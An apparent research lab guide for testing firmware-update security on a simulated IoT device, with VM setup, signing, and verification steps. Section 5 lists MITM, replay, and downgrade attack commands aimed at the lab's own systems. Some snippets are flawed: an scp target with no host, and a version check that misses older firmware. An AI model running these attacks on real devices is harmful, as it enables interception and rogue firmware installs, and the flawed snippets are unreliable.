**Experiment Guidance Document (Updated)**

## 1. **Experiment Overview**
This document provides a step-by-step guide to setting up and conducting the experiment as described in the Interim Report. It includes configuring a web server, encrypting and sending files using multiple cryptographic protocols, executing attack vectors with detailed commands, and evaluating cryptographic protocol performance and security. A new section has been added to ensure firmware update authenticity verification on the IoT device.

---

## 2. **Network and System Setup**

### **2.1 Virtual Machine Configuration**
Ensure that you have three Virtual Machines (VMs) running on the guest WiFi network with the following roles:
- **VM1 (Simulated IoT Device)** — Ubuntu Server 24.04.1 LTS (Resource-constrained)
- **VM2 (FOTA Server)** — Ubuntu Desktop 24.04.1 LTS (Hosts and distributes firmware updates)
- **VM3 (Adversary)** — Kali Linux 2024.2 (Captures traffic and conducts attacks)

### **2.2 Setting Resource Constraints for IoT Device (VM1)**
Using Oracle VirtualBox:
- **CPU**: 1 core, 70% execution cap
- **Memory**: 256MB RAM
- **Storage**: 512MB Disk
- **Network Adapter**: Internal Wi-Fi network, no internet, 1MB/s bandwidth

---

## 3. **Web Server Setup (VM2)**
### **3.1 Install Apache Web Server (on VM2)**
```bash
sudo apt update
sudo apt install apache2 -y
sudo systemctl start apache2
sudo systemctl enable apache2
```

### **3.2 Configure Firmware Hosting (on VM2)**
```bash
sudo mkdir /var/www/html/firmware
sudo chmod -R 755 /var/www/html/firmware
```

### **3.3 Uploading Firmware Updates (on VM2)**
Use the script `upload_firmware.sh` to:
- Select which firmware to upload
- Move the firmware and its signature to `/var/www/html/firmware`
- Archive a copy to `firmware_uploaded/`
- Send a UDP notification to the IoT device (VM1)

### **3.4 Verify Web Server Access (on VM2)**
```bash
curl http://localhost/firmware/<filename>
```

---

## 4. **Implementing Cryptographic Protocols (on VM2)**
### **4.1 Generate Keys**
Run the script `key_generation.sh` to generate the following key pairs:
- ECDSA (ecdsa_private.pem, ecdsa_public.pem)
- Ed25519 (ed25519_private.pem, ed25519_public.pem)
- ECDH (ecdh_private.pem, ecdh_public.pem)

### **4.2 Encrypt and Sign Firmware**
Run the script `encrypt_firmware.sh` to:
- Prompt user for input firmware path
- Perform encryption + signing using:
  - AES-128
  - ChaCha20
  - ECDSA + SHA-256
  - Ed25519
  - ECDH + ChaCha20
- Output files named: `<protocol>_<firmware-name>.enc` and `.sig`
- Measure CPU, memory, and timing metrics for each operation
- Append all performance data to a CSV file with timestamped entries

---

## 5. **Attack Vectors (on VM3)**
### **5.1 Man-in-the-Middle Attack (MITM)**
```bash
mitmproxy -p 8080 --mode transparent
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```
Capture using:
```bash
mitmproxy -m transparent -w firmware_capture.pcap
```

### **5.2 Replay Attack**
```bash
sudo tcpdump -i wlan0 -w firmware_update.pcap
```
Then:
```python
from scapy.all import *
packets = rdpcap('firmware_update.pcap')
sendp(packets, iface='wlan0')
```

### **5.3 Downgrade Attack**
```bash
scp firmware_old.enc firmware_old.sig user@:/tmp/
echo "Installing older version..." > /tmp/update.log
mv /tmp/firmware_old.enc /firmware/firmware_v1.enc
```

---

## 6. **Monitoring Performance and Security (on VM1)**
### **6.1 Measure Encryption & Decryption Times**
```bash
time openssl enc -aes-128-cbc -salt -in firmware_v1.bin -out firmware_v1.enc -k "SecureKey"
```

### **6.2 Monitor CPU & Memory Usage on IoT Device (VM1)**
```bash
top -p $(pgrep openssl)
free -m
```

### **6.3 Evaluate Network Performance**
```bash
sudo tcpdump -i wlan0 -w network_analysis.pcap
```
Analyze in Wireshark.

### **6.4 Log Attack Success or Failure (on VM1)**
```bash
tail -f /var/log/apache2/access.log
cat /tmp/update.log
```

---

## 7. **Firmware Update Verification (on VM1)**
Run the script `firmware_listener.sh` to:
- Listen for firmware notifications via UDP
- Prompt user before downloading and installing
- Download firmware and signature from the server
- Verify digital signature before installation
- Reject update if verification fails or if firmware version is repeated
- Log all performance data (latency, CPU/memory, integrity checks) to a local CSV file

### **Verify Signature Example (Within Listener Script)**
```bash
openssl dgst -sha256 -verify ecdsa_public.pem -signature firmware_v1.sig firmware_v1.enc || {
  echo "[ERROR] Signature verification failed. Update aborted." >> /tmp/update.log
  exit 1
}
```

### **Check Firmware Version (Optional)**
```bash
PREV_VERSION=$(cat /etc/firmware_version)
NEW_VERSION=$(strings firmware_v1.enc | grep VERSION)
if [ "$NEW_VERSION" = "$PREV_VERSION" ]; then
  echo "[WARNING] Firmware already installed or older. Update aborted." >> /tmp/update.log
  exit 1
fi
```

---

## 8. **Evaluation Criteria**
1. **Encryption/Decryption Times**
2. **CPU/Memory Usage**
3. **Attack Outcomes**
4. **Network Latency**
5. **Firmware Authenticity & Integrity Check (New)**
6. **Replay/Downgrade Mitigation Effectiveness**

---

## 9. **Conclusion**
This document outlines the refined experiment setup ensuring realistic firmware security by including digital signature verification on the IoT device before updates are accepted. This change closes a critical security gap and supports the original research question regarding lightweight cryptographic security in constrained IoT environments.
